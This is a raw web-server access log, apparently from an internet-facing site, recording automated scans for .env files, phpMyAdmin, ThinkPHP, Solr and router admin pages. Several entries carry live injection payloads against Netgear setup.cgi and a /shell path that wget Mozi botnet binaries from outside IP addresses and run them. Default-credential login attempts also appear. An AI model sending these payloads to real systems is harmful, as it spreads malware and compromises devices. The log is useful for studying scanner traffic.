[0mGET / [32m200 [0m0.945 ms - 859[0m
[0mGET /robots.txt [33m404 [0m1.032 ms - 1434[0m
[0mGET /sitemap.xml [33m404 [0m0.981 ms - 1434[0m
[0mGET /.well-known/security.txt [33m404 [0m0.963 ms - 1434[0m
[0mGET /favicon.ico [33m404 [0m0.960 ms - 1434[0m
[0mGET /.env [33m404 [0m0.858 ms - 1434[0m
[0mGET /portal/.env [33m404 [0m0.886 ms - 1434[0m
[0mGET /laravel/.env [33m404 [0m1.526 ms - 1434[0m
[0mGET /public/.env [33m404 [0m0.893 ms - 1434[0m
[0mGET / [32m200 [0m0.908 ms - 859[0m
[0mGET / [32m200 [0m0.907 ms - 859[0m
[0mPOST /HNAP1/ [33m404 [0m0.825 ms - 1429[0m
[0mGET / [32m200 [0m0.894 ms - 859[0m
[0mGET /.env [33m404 [0m0.850 ms - 1434[0m
[0mPOST / [33m404 [0m1.223 ms - 1429[0m
[0mGET /.env [33m404 [0m0.854 ms - 1434[0m
[0mPOST / [33m404 [0m1.774 ms - 1429[0m
[0mGET / [32m200 [0m0.908 ms - 859[0m
[0mGET / [32m200 [0m0.761 ms - 859[0m
[0mGET / [32m200 [0m0.895 ms - 859[0m
[0mGET / [32m200 [0m0.873 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.787 ms - 1429[0m
[0mPOST /HNAP1/ [33m404 [0m0.790 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.779 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.767 ms - 1429[0m
[0mGET / [32m200 [0m0.917 ms - 859[0m
[0mGET / [32m200 [0m1.018 ms - 859[0m
[0mGET / [32m200 [0m0.819 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.932 ms - 1434[0m
[0mGET / [32m200 [0m0.885 ms - 859[0m
[0mGET /.env [33m404 [0m0.668 ms - 1434[0m
[0mGET /.remote [33m404 [0m0.646 ms - 1434[0m
[0mGET /.local [33m404 [0m0.634 ms - 1434[0m
[0mGET /.production [33m404 [0m0.654 ms - 1434[0m
[0mGET //vendor/.env [33m404 [0m0.635 ms - 1434[0m
[0mGET //lib/.env [33m404 [0m0.645 ms - 1434[0m
[0mGET //lab/.env [33m404 [0m0.631 ms - 1434[0m
[0mGET //cronlab/.env [33m404 [0m1.312 ms - 1434[0m
[0mGET //cron/.env [33m404 [0m0.640 ms - 1434[0m
[0mGET //core/.env [33m404 [0m0.614 ms - 1434[0m
[0mGET //core/app/.env [33m404 [0m0.616 ms - 1434[0m
[0mGET //core/Datavase/.env [33m404 [0m0.616 ms - 1434[0m
[0mGET //database/.env [33m404 [0m0.622 ms - 1434[0m
[0mGET //config/.env [33m404 [0m0.615 ms - 1434[0m
[0mGET //assets/.env [33m404 [0m0.607 ms - 1434[0m
[0mGET //app/.env [33m404 [0m0.636 ms - 1434[0m
[0mGET //apps/.env [33m404 [0m0.604 ms - 1434[0m
[0mGET //uploads/.env [33m404 [0m0.620 ms - 1434[0m
[0mGET //sitemaps/.env [33m404 [0m0.612 ms - 1434[0m
[0mGET //saas/.env [33m404 [0m0.723 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.886 ms - 859[0m
[0mGET / [32m200 [0m0.970 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m1.593 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.922 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.750 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.442 ms - 1429[0m
[0mGET / [32m200 [0m0.935 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.778 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.784 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.752 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.813 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.791 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.781 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.771 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.780 ms - 1429[0m
[0mGET /.env [33m404 [0m0.989 ms - 1434[0m
[0mPOST / [33m404 [0m1.046 ms - 1429[0m
[0mPOST /HNAP1/ [33m404 [0m0.803 ms - 1429[0m
[0mGET /muieblackcat [33m404 [0m1.481 ms - 1434[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.879 ms - 1434[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.909 ms - 1434[0m
[0mGET //pHpMyAdMiN/scripts/setup.php [33m404 [0m4.140 ms - 1434[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.900 ms - 1434[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m0.801 ms - 1434[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.918 ms - 1434[0m
[0mGET //PMA2005/scripts/setup.php [33m404 [0m0.852 ms - 1434[0m
[0mGET //admin/mysql/scripts/setup.php [33m404 [0m0.904 ms - 1434[0m
[0mGET //admin/phpmyadmin/scripts/setup.php [33m404 [0m0.898 ms - 1434[0m
[0mGET //admin/scripts/setup.php [33m404 [0m0.902 ms - 1434[0m
[0mGET //db/scripts/setup.php [33m404 [0m0.805 ms - 1434[0m
[0mGET //dbadmin/scripts/setup.php [33m404 [0m0.676 ms - 1434[0m
[0mGET //mysql-admin/scripts/setup.php [33m404 [0m0.761 ms - 1434[0m
[0mGET //mysql/scripts/setup.php [33m404 [0m0.702 ms - 1434[0m
[0mGET //mysqladmin/scripts/setup.php [33m404 [0m0.736 ms - 1434[0m
[0mGET //mysqlmanager/scripts/setup.php [33m404 [0m0.715 ms - 1434[0m
[0mGET //p/m/a/scripts/setup.php [33m404 [0m0.794 ms - 1434[0m
[0mGET //noxdir/nosuichfile.php [33m404 [0m0.791 ms - 1434[0m
[0mGET //nosuichfile.php [33m404 [0m0.773 ms - 1434[0m
[0mGET //pHpMy/scripts/setup.php [33m404 [0m1.573 ms - 1434[0m
[0mGET //php-my-admin/scripts/setup.php [33m404 [0m0.720 ms - 1434[0m
[0mGET //php-myadmin/scripts/setup.php [33m404 [0m0.744 ms - 1434[0m
[0mGET //phpMyA/scripts/setup.php [33m404 [0m0.738 ms - 1434[0m
[0mGET //phpMyAdmi/scripts/setup.php [33m404 [0m0.708 ms - 1434[0m
[0mGET //phpMyAdmin-2/scripts/setup.php [33m404 [0m0.805 ms - 1434[0m
[0mGET //phpMyAdmin-3/scripts/setup.php [33m404 [0m0.877 ms - 1434[0m
[0mGET //phpMyAdmin-4/scripts/setup.php [33m404 [0m0.781 ms - 1434[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.785 ms - 1434[0m
[0mGET //phpMyAdmin1/scripts/setup.php [33m404 [0m1.515 ms - 1434[0m
[0mGET //phpMyAdmin2/scripts/setup.php [33m404 [0m0.843 ms - 1434[0m
[0mGET //phpMyAds/scripts/setup.php [33m404 [0m0.858 ms - 1434[0m
[0mGET //phpm/scripts/setup.php [33m404 [0m0.916 ms - 1434[0m
[0mGET //phpmanager/scripts/setup.php [33m404 [0m0.809 ms - 1434[0m
[0mGET //phpmy-admin/scripts/setup.php [33m404 [0m0.881 ms - 1434[0m
[0mGET //phpmy/scripts/setup.php [33m404 [0m0.933 ms - 1434[0m
[0mGET //phpmyad-sys/scripts/setup.php [33m404 [0m0.784 ms - 1434[0m
[0mGET //phpmyad/scripts/setup.php [33m404 [0m0.890 ms - 1434[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.898 ms - 1434[0m
[0mGET //phpmyadmin2/scripts/setup.php [33m404 [0m0.746 ms - 1434[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.776 ms - 1434[0m
[0mGET //pma2005/scripts/setup.php [33m404 [0m0.791 ms - 1434[0m
[0mGET //scripts/setup.php [33m404 [0m0.797 ms - 1434[0m
[0mGET //sqladmin/scripts/setup.php [33m404 [0m0.839 ms - 1434[0m
[0mGET //sqlmanager/scripts/setup.php [33m404 [0m0.737 ms - 1434[0m
[0mGET //sqlweb/scripts/setup.php [33m404 [0m0.782 ms - 1434[0m
[0mGET //vhcs2/tools/pma/scripts/setup.php [33m404 [0m4.680 ms - 1434[0m
[0mGET //web/phpMyAdmin/scripts/setup.php [33m404 [0m0.804 ms - 1434[0m
[0mGET //webadmin/scripts/setup.php [33m404 [0m1.573 ms - 1434[0m
[0mGET //webdb/scripts/setup.php [33m404 [0m0.794 ms - 1434[0m
[0mGET //websql/scripts/setup.php [33m404 [0m0.787 ms - 1434[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.904 ms - 1434[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.962 ms - 1429[0m
[0mGET /portal/redlion [33m404 [0m0.967 ms - 1434[0m
[0mGET /.env [33m404 [0m0.928 ms - 1434[0m
[0mGET /v2/_catalog [33m404 [0m0.788 ms - 1434[0m
[0mGET /.git/config [33m404 [0m0.758 ms - 1434[0m
[0mGET / [32m200 [0m0.753 ms - 859[0m
[0mGET / [32m200 [0m0.900 ms - 859[0m
[0mGET / [32m200 [0m0.908 ms - 859[0m
[0mGET / [32m200 [0m0.883 ms - 859[0m
[0mGET / [32m200 [0m0.903 ms - 859[0m
[0mGET / [32m200 [0m0.894 ms - 859[0m
[0mGET /.env [33m404 [0m0.897 ms - 1434[0m
[0mPOST / [33m404 [0m0.813 ms - 1429[0m
[0mGET http://www.google.com [32m200 [0m0.944 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.950 ms - 1434[0m
[0mGET / [32m200 [0m0.912 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.457 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.848 ms - 859[0m
[0mGET /.env [33m404 [0m0.851 ms - 1434[0m
[0mPOST / [33m404 [0m0.964 ms - 1429[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.914 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.878 ms - 1434[0m
[0mGET / [32m200 [0m0.908 ms - 859[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.739 ms - 1429[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.937 ms - 1429[0m
[0mGET /TP/public/index.php [33m404 [0m0.969 ms - 1434[0m
[0mGET /TP/index.php [33m404 [0m0.918 ms - 1434[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.964 ms - 1434[0m
[0mGET /html/public/index.php [33m404 [0m0.911 ms - 1434[0m
[0mGET /public/index.php [33m404 [0m0.930 ms - 1434[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.931 ms - 1434[0m
[0mGET /elrekt.php [33m404 [0m1.005 ms - 1434[0m
[0mGET /index.php [33m404 [0m3.704 ms - 1434[0m
[0mGET / [32m200 [0m0.884 ms - 859[0m
[0mGET /manager/text/list [33m404 [0m0.962 ms - 1434[0m
[0mGET /.env [33m404 [0m0.870 ms - 1434[0m
[0mPOST / [33m404 [0m0.815 ms - 1429[0m
[0mGET / [32m200 [0m0.927 ms - 859[0m
[0mGET / [32m200 [0m1.349 ms - 859[0m
[0mGET / [32m200 [0m0.864 ms - 859[0m
[0mGET /manager/html [33m404 [0m0.983 ms - 1434[0m
[0mGET /boaform/admin/formLogin?username=admin&psd=admin [33m404 [0m2.171 ms - 1434[0m
[0mGET /.env [33m404 [0m0.842 ms - 1434[0m
[0mPOST / [33m404 [0m0.980 ms - 1429[0m
[0mGET /CFIDE/administrator/ [33m404 [0m0.988 ms - 1434[0m
[0mGET /manager/html [33m404 [0m0.949 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.784 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.760 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.786 ms - 1429[0m
[0mGET / [32m200 [0m1.467 ms - 859[0m
[0mGET / [32m200 [0m0.905 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.934 ms - 1434[0m
[0mGET http://azenv.net/ [32m200 [0m0.880 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.773 ms - 1429[0m
[0mGET / [32m200 [0m0.905 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m1.419 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.779 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.767 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.782 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.862 ms - 1429[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.001 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.843 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.794 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.768 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.769 ms - 1429[0m
[0mGET /.env [33m404 [0m0.908 ms - 1434[0m
[0mPOST / [33m404 [0m0.904 ms - 1429[0m
[0mGET / [32m200 [0m0.935 ms - 859[0m
[0mGET / [32m200 [0m0.943 ms - 859[0m
[0mGET / [32m200 [0m0.948 ms - 859[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://119.180.239.75:36200/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.007 ms - 1434[0m
[0mHEAD /robots.txt [33m404 [0m0.888 ms - 1434[0m
[0mHEAD /robots.txt [33m404 [0m0.911 ms - 1434[0m
[0mGET / [32m200 [0m1.491 ms - 859[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m0.931 ms - 1434[0m
[0mGET / [32m200 [0m0.885 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.942 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.844 ms - 859[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.850 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.899 ms - 1434[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.947 ms - 1429[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.007 ms - 1434[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.021 ms - 1429[0m
[0mGET / [32m200 [0m0.965 ms - 859[0m
[0mGET / [32m200 [0m0.904 ms - 859[0m
[0mGET /js/bootstrap.min.js [32m200 [0m2.206 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m0.630 ms - 89476[0m
[0mGET /robots.txt [33m404 [0m0.956 ms - 1434[0m
[0mGET http://azenv.net/ [32m200 [0m0.953 ms - 859[0m
[0mGET / [32m200 [0m0.885 ms - 859[0m
[0mGET / [32m200 [0m0.913 ms - 859[0m
[0mGET / [32m200 [0m0.911 ms - 859[0m
[0mGET / [32m200 [0m0.967 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.852 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.801 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.818 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.834 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.799 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.799 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.778 ms - 1429[0m
[0mGET / [32m200 [0m0.918 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.793 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.783 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.765 ms - 1429[0m
[0mGET / [32m200 [0m0.939 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.768 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.769 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.458 ms - 1429[0m
[0mGET / [32m200 [0m0.940 ms - 859[0m
[0mGET /TP/public/index.php [33m404 [0m0.914 ms - 1434[0m
[0mGET /TP/index.php [33m404 [0m0.996 ms - 1434[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m1.012 ms - 1434[0m
[0mGET /html/public/index.php [33m404 [0m0.967 ms - 1434[0m
[0mGET /public/index.php [33m404 [0m0.978 ms - 1434[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.961 ms - 1434[0m
[0mGET /elrekt.php [33m404 [0m0.942 ms - 1434[0m
[0mGET /index.php [33m404 [0m1.640 ms - 1434[0m
[0mGET / [32m200 [0m6.186 ms - 859[0m
[0mGET / [32m200 [0m1.014 ms - 859[0m
[0mGET /hudson [33m404 [0m0.927 ms - 1434[0m
[0mGET / [32m200 [0m0.904 ms - 859[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.992 ms - 1434[0m
[0mHEAD / [32m200 [0m1.541 ms - 859[0m
[0mGET / [32m200 [0m0.841 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://124.131.135.137:52929/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.937 ms - 1434[0m
[0mGET / [32m200 [0m0.864 ms - 859[0m
[0mGET / [32m200 [0m0.928 ms - 859[0m
[0mGET / [32m200 [0m0.852 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.892 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.952 ms - 859[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.933 ms - 1434[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.845 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.950 ms - 1434[0m
[0mGET /TP/public/index.php [33m404 [0m0.924 ms - 1434[0m
[0mGET /TP/index.php [33m404 [0m0.955 ms - 1434[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.941 ms - 1434[0m
[0mGET /html/public/index.php [33m404 [0m0.939 ms - 1434[0m
[0mGET /public/index.php [33m404 [0m0.938 ms - 1434[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.948 ms - 1434[0m
[0mGET /elrekt.php [33m404 [0m0.905 ms - 1434[0m
[0mGET /index.php [33m404 [0m0.935 ms - 1434[0m
[0mGET / [32m200 [0m0.904 ms - 859[0m
[0mGET / [32m200 [0m0.923 ms - 859[0m
[0mGET / [32m200 [0m0.923 ms - 859[0m
[0mGET / [32m200 [0m0.820 ms - 859[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://60.243.116.201:34056/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.992 ms - 1434[0m
[0mGET / [32m200 [0m0.895 ms - 859[0m
[0mGET /favicon.ico [33m404 [0m0.945 ms - 1434[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.957 ms - 1429[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m0.936 ms - 1434[0m
[0mGET / [32m200 [0m0.871 ms - 859[0m
[0mGET /.env [33m404 [0m0.861 ms - 1434[0m
[0mPOST / [33m404 [0m0.996 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.781 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.812 ms - 1429[0m
[0mGET / [32m200 [0m0.850 ms - 859[0m
[0mGET / [32m200 [0m0.912 ms - 859[0m
[0mGET / [32m200 [0m1.554 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.809 ms - 1429[0m
[0mGET /portal/redlion [33m404 [0m1.031 ms - 1434[0m
[0mGET /.env [33m404 [0m0.920 ms - 1434[0m
[0mPOST / [33m404 [0m0.924 ms - 1429[0m
[0mGET /.env [33m404 [0m0.892 ms - 1434[0m
[0mGET /vendor/.env [33m404 [0m1.492 ms - 1434[0m
[0mGET /storage/.env [33m404 [0m0.937 ms - 1434[0m
[0mGET /public/.env [33m404 [0m0.889 ms - 1434[0m
[0mPOST / [33m404 [0m0.964 ms - 1429[0m
[0mGET / [32m200 [0m0.886 ms - 859[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.540 ms - 1434[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.905 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.776 ms - 1429[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.865 ms - 859[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.892 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.817 ms - 1429[0m
[0mGET / [32m200 [0m0.931 ms - 859[0m
[0mGET / [32m200 [0m0.885 ms - 859[0m
[0mGET /favicon.ico [33m404 [0m1.059 ms - 1434[0m
[0mGET / [32m200 [0m0.855 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.783 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m1.409 ms - 1429[0m
[0mGET /.env [33m404 [0m0.933 ms - 1434[0m
[0mPOST / [33m404 [0m0.957 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.809 ms - 1429[0m
[0mGET / [32m200 [0m1.539 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.822 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.853 ms - 1429[0m
[0mGET / [32m200 [0m0.938 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.809 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.763 ms - 1429[0m
[0mGET / [32m200 [0m0.888 ms - 859[0m
[0mGET /wp-includes/js/jquery/jquery.js [33m404 [0m0.996 ms - 1434[0m
[0mGET /administrator/help/en-GB/toc.json [33m404 [0m0.974 ms - 1434[0m
[0mGET /administrator/language/en-GB/install.xml [33m404 [0m1.619 ms - 1434[0m
[0mGET /plugins/system/debug/debug.xml [33m404 [0m0.898 ms - 1434[0m
[0mGET /administrator/ [33m404 [0m0.986 ms - 1434[0m
[0mGET /misc/ajax.js [33m404 [0m0.962 ms - 1434[0m
[0mGET / [32m200 [0m0.859 ms - 859[0m
[0mGET /admin/view/javascript/common.js [33m404 [0m0.930 ms - 1434[0m
[0mGET /admin/includes/general.js [33m404 [0m0.964 ms - 1434[0m
[0mGET /images/editor/separator.gif [33m404 [0m1.545 ms - 1434[0m
[0mGET /js/header-rollup-554.js [33m404 [0m3.734 ms - 1434[0m
[0mGET /vendor/phpunit/phpunit/build.xml [33m404 [0m0.961 ms - 1434[0m
[0mGET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media [33m404 [0m1.777 ms - 1434[0m
[0mGET /.env [33m404 [0m0.887 ms - 1434[0m
[0mGET / [32m200 [0m0.884 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.836 ms - 1429[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.911 ms - 1429[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://112.237.60.22:56524/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.949 ms - 1434[0m
[0mGET / [32m200 [0m0.908 ms - 859[0m
[0mGET / [32m200 [0m0.939 ms - 859[0m
[0mGET / [32m200 [0m0.907 ms - 859[0m
[0mGET /.env [33m404 [0m0.865 ms - 1434[0m
[0mPOST / [33m404 [0m1.001 ms - 1429[0m
[0mGET /.env [33m404 [0m4.986 ms - 1434[0m
[0mPOST / [33m404 [0m0.878 ms - 1429[0m
[0mGET / [32m200 [0m0.932 ms - 859[0m
[0mGET / [32m200 [0m1.023 ms - 859[0m
[0mGET / [32m200 [0m0.860 ms - 859[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.59.116.66:54943/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.932 ms - 1434[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.178.74.9:46621/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.557 ms - 1434[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.115.182.200:56487/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.011 ms - 1434[0m
[0mGET / [32m200 [0m0.911 ms - 859[0m
[0mGET / [32m200 [0m0.905 ms - 859[0m
[0mHEAD / [32m200 [0m0.900 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m1.400 ms - 1429[0m
[0mGET / [32m200 [0m0.936 ms - 859[0m
[0mGET / [32m200 [0m0.726 ms - 859[0m
[0mGET /index.php [33m404 [0m0.951 ms - 1434[0m
[0mGET /phpmyadmin/index.php [33m404 [0m0.888 ms - 1434[0m
[0mPOST /sns/message/receive [33m404 [0m0.771 ms - 1429[0m
[0mGET /.env [33m404 [0m0.848 ms - 1434[0m
[0mPOST / [33m404 [0m0.793 ms - 1429[0m
[0mPOST /sns/message/receive [33m404 [0m0.838 ms - 1429[0m
[0mGET / [32m200 [0m0.862 ms - 859[0m
[0mPOST /sns/message/receive [33m404 [0m0.789 ms - 1429[0m
[0mPOST /cgi-bin/web_json.cgi [33m404 [0m1.976 ms - 1429[0m
[0mGET / [32m200 [0m0.881 ms - 859[0m
[0mGET /hudson [33m404 [0m0.927 ms - 1434[0m
[0mPOST /cgi-bin/web_json.cgi [33m404 [0m0.929 ms - 1429[0m
[0mGET /muieblackcat [33m404 [0m0.914 ms - 1434[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.943 ms - 1434[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.825 ms - 1434[0m
[0mGET //pHpMyAdMiN/scripts/setup.php [33m404 [0m0.807 ms - 1434[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.915 ms - 1434[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m1.255 ms - 1434[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.968 ms - 1434[0m
[0mGET //PMA2005/scripts/setup.php [33m404 [0m0.893 ms - 1434[0m
[0mGET //admin/mysql/scripts/setup.php [33m404 [0m0.857 ms - 1434[0m
[0mGET //admin/phpmyadmin/scripts/setup.php [33m404 [0m0.864 ms - 1434[0m
[0mGET //admin/scripts/setup.php [33m404 [0m0.811 ms - 1434[0m
[0mGET //db/scripts/setup.php [33m404 [0m0.810 ms - 1434[0m
[0mGET //dbadmin/scripts/setup.php [33m404 [0m0.831 ms - 1434[0m
[0mGET //mysql-admin/scripts/setup.php [33m404 [0m0.862 ms - 1434[0m
[0mGET //mysql/scripts/setup.php [33m404 [0m0.840 ms - 1434[0m
[0mGET //mysqladmin/scripts/setup.php [33m404 [0m0.831 ms - 1434[0m
[0mGET //mysqlmanager/scripts/setup.php [33m404 [0m0.903 ms - 1434[0m
[0mGET //p/m/a/scripts/setup.php [33m404 [0m0.898 ms - 1434[0m
[0mGET //noxdir/nosuichfile.php [33m404 [0m0.898 ms - 1434[0m
[0mGET //nosuichfile.php [33m404 [0m0.884 ms - 1434[0m
[0mGET //pHpMy/scripts/setup.php [33m404 [0m1.702 ms - 1434[0m
[0mGET //php-my-admin/scripts/setup.php [33m404 [0m0.875 ms - 1434[0m
[0mGET //php-myadmin/scripts/setup.php [33m404 [0m0.787 ms - 1434[0m
[0mGET //phpMyA/scripts/setup.php [33m404 [0m0.831 ms - 1434[0m
[0mGET //phpMyAdmi/scripts/setup.php [33m404 [0m0.808 ms - 1434[0m
[0mGET //phpMyAdmin-2/scripts/setup.php [33m404 [0m0.802 ms - 1434[0m
[0mGET //phpMyAdmin-3/scripts/setup.php [33m404 [0m0.884 ms - 1434[0m
[0mGET //phpMyAdmin-4/scripts/setup.php [33m404 [0m0.834 ms - 1434[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.846 ms - 1434[0m
[0mGET //phpMyAdmin1/scripts/setup.php [33m404 [0m0.830 ms - 1434[0m
